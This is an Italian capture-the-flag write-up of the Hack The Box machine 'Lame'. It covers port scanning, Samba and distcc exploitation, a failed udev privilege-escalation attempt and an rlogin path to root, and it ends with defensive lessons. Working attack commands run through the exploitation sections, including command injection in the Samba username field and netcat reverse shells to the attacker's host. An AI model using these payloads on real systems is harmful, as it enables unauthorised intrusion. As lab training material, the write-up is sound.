**Author: Noto La Diega Alessandro**

**TARGET: 10.10.10.3**

# INFORMATION GATHERING

Iniziamo con un scan veloce di [[Nmap | Nmap]]
```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -O 10.10.10.3
Nmap scan report for 10.10.10.3
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-05-08T15:48:08-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h00m45s, deviation: 2h49m42s, median: 45s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.11 seconds
```

Troviamo aperte le porte:
- 21/tcp  open  ftp         vsftpd 2.3.4 (ftp-anon: Anonymous FTP login allowed) (FTP code 230)
- 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
- 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Lanciamo anche un scan su tutte le porte per essere sicuro di aver coperto ogni porta
```bash
┌──(root㉿kali)-[/home/kali/htb/lame]
└─# nmap -sC -sV -O -p- 10.10.10.3
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```
troviamo un altra porta aperta che in seguito analizzeremo

# ENUMERATION

## **[[Port 21 FTP | Port 21 VSFPD 2.3.4]]** 

Una rapida ricerca su Google ci mostra che questa versione è notoriamente vulnerabile all'esecuzione di un comando backdoor che viene attivato inserendo una stringa che contiene i caratteri ":)" come nome utente.
Quando viene attivata la backdoor, la macchina di destinazione apre una shell sulla porta 6200.
Questo exploit è abbastanza semplice da sfruttare manualmente, ma stiamo cercando di passare a una maggiore automazione
quindi vediamo se esiste uno script nmap che lo controlla già.

```bash
┌──(root㉿kali)-[/home/kali/htb/lame]
└─# nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 16:06 EDT
Nmap scan report for 10.10.10.3
Host is up (0.064s latency).

PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 21.67 seconds
                                                                                
```

Non è vulnerabile, passiamo alla porta 22, ci sono diversi scrip per il forzare 
ma porterebbe via parecchio tempo passiamo alla porta 139 

## **[[Port 139 Netbios| Port 139 NETBIOS-SSN Samba]] smbd 3.X - 4.X **

Utilizziamo smbclient 
(-L lista tutte le cartelle condivise)
```bash
┌──(root㉿kali)-[/home/kali/htb/lame]
└─# smbclient -L 10.10.10.3                  
Password for [WORKGROUP\root]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successfull        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME

```

Vediamo che permessi abbiamo su queste cartelle

Utilizziamo smbamp:
(-H sta per HOST)
```bash
┌──(root㉿kali)-[/home/kali/htb/lame]
└─# smbmap -H 10.10.10.3   
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```

Interessante sulla cartella tmp abbiamo permessi di scittura e lettura
Cercandosu google se la vesione di samba ha qualche vulnerabilità troviamo questa CVE 2007-2447
https://github.com/Un4gi/CVE-2007-2447

La lettura del codice ci dice che tutto ciò che fa lo script è eseguire il seguente comando,
dove "payload.encoded" sarebbe una shell inversa inviata alla nostra macchina d'attacco.

"/=`nohup " + payload.encoded + "`"

## **[[Port 3632 DISTCCD | Port 3632 DISTCC V1]]**

Cercando su google "distcc v1" rivela che questo servizio è vulnerabile a un'esecuzione di codice remoto e c'è uno script nmap che può verificarlo.

```bash
┌──(root㉿kali)-[/home/kali/htb/lame]
└─# nmap --script distcc-cve2004-2687 -p 3632 10.10.10.3
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 16:22 EDT
Nmap scan report for 10.10.10.3
Host is up (0.057s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|       https://distcc.github.io/security.html
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687

Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
                                                              
```

E'venerabile ma ci torniamo dopo

# EXPLOITATION

## 1. Samba

Ci mettiamo in ascolto con il classico nc -nvlp
```bash
┌──(root㉿kali)-[/home/kali/htb/lame]
└─# nc -nvlp 4444
listening on [any] 4444 ...
```

Ci collegiamo con smbclient (// per colleargsi ), e seguiamo le indicazione dell exploit
```bash
┌──(root㉿kali)-[/home/kali/htb/lame]
└─# smbclient //10.10.10.3/tmp
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "/=`nohup nc -nv 10.10.14.39 4444 -e /bin/sh`"
Password: 
session setup failed: NT_STATUS_LOGON_FAILURE
smb: \> 
``````

Otteniamo cosi una shell con privilegi da root
```bash
┌──(root㉿kali)-[/home/kali/htb/lame]
└─# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.39] from (UNKNOWN) [10.10.10.3] 37753
```

## 2. Distcc

Abbimamo visto in precedenza che c'è un scipt nmap distcc.cve2004-2687 che ci permette 
di esegurire del codice, quindi come prima ci mettiamo un ascolto sempre con nc e eseguiamo:
```bash

nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.39 4444 -e /bin/bash'"
```
Otteniamo cosi una shell con bassi privilegi 

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -nvlp 4444                                     
listening on [any] 4444 ...
connect to [10.10.14.39] from (UNKNOWN) [10.10.10.3] 42871
whoami
daemon
```

# PRIVESC

Avremo bisogno di intensificare i privilegi. Google la versione del sistema operativo - Linux 2.6.24 per vedere se è vulnerabile a eventuali exploit. Ho provato CVE 2016–5195 e CVE 2008–0600, ma non hanno funzionato.
Proviamo CVE 2009–1185. 
Scarica l'exploit da searchsploit.

```bash
┌──(root㉿kali)-[/home/kali/htb/devel]
└─# searchsploit -m 8572
```

Seguiamo le istruzione dell'exploit
```txt
 Usage:
 *
 *   Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, 
 *   usually is the udevd PID minus 1) as argv[1].
 *
 *   The exploit will execute /tmp/run as root so throw whatever payload you 
 *   want in there.
```

compliamo l'exploit con il seguente comando:
```bash
gcc 8572.c -o 8572
```

Tiriamo su un server python per scaricare l'exploit sulla macchina target:
```basj
python3 -m http.server 9001
```

Sull macchina target creamio un file "Run" con il seguente contenuto 
```bash
nano run
"#!/bin/bash
nc -nv 10.10.14.21 4445 -e /bin/bash'
```

Vediamo il PID che ci serve come dicono le istruzioni con il comando
```bash
cat /proc/net/netlink
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
ddf3e800 0   0      00000000 0        0        00000000 2
dcc15400 4   0      00000000 0        0        00000000 2
dd34f800 7   0      00000000 0        0        00000000 2
dd83f600 9   0      00000000 0        0        00000000 2
dd848400 10  0      00000000 0        0        00000000 2
dd82e400 15  2731   00000001 0        0        00000000 2
ddf3ec00 15  0      00000000 0        0        00000000 2
ddf46800 16  0      00000000 0        0        00000000 2
df51d200 18  0      00000000 0        0        00000000 2
```

Ci mettiamo in ascolto con nc 
```bash
┌──(root㉿kali)-[/home/kali/htb/devel]
└─# nc -nlvp  4445
listening on [any] 4445 ...
```

Sulla macchina target eseguiamo 
```
./8572 2731
```

Sembra non funzionare 

# PRIVESC 2

con which nmap scopriamo che la macchina ha installato nmap lanciamo uno scan interno
```bash
nmap -p- localhost
513/tcp   open  login
514/tcp   open  shell
953/tcp   open  rndc
1099/tcp  open  unknown
1524/tcp  open  ingreslock
```

Notiamo la porta 513 aperta
Questo servizio era utilizzato principalmente in passato per l'amministrazione remota,
ma ora, a causa di problemi di sicurezza,
questo servizio è stato sostituito da slogin e ssh

A questo link troviamo quello che ci serve per l'exploitare questo servizio 
https://book.hacktricks.xyz/network-services-pentesting/pentesting-rlogin

abusiamo di questo servizio con il seguente comando 
```bash
rlogin -l root localhost

rlogin -l root localhost
Last login: Thu May 11 01:55:50 EDT 2023 from localhost on pts/1
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@lame:~# whoami
whoami
root
root@lame:~# 
```


# LESSION LEARNED

1. Eseguire sempre una scansione completa delle porte! Non avremmo scoperto il demone del compilatore distribuito vulnerabile distcc in esecuzione sulla porta 3632 se avessimo eseguito solo la scansione iniziale. Questo ci ha dato un punto d'appoggio iniziale sulla macchina dove alla fine siamo stati in grado di aumentare i privilegi a root.
2. Aggiorna e correggi sempre il tuo software! In entrambi i metodi di sfruttamento, abbiamo sfruttato le vulnerabilità divulgate pubblicamente che dispongono di aggiornamenti e patch di sicurezza disponibili.
3. Le porte Samba non dovrebbero essere esposte! Utilizza un firewall per negare l'accesso a questi servizi dall'esterno della tua rete. Inoltre, limita l'accesso al tuo server solo agli utenti validi e disabilita l'accesso WRITE se non necessario.
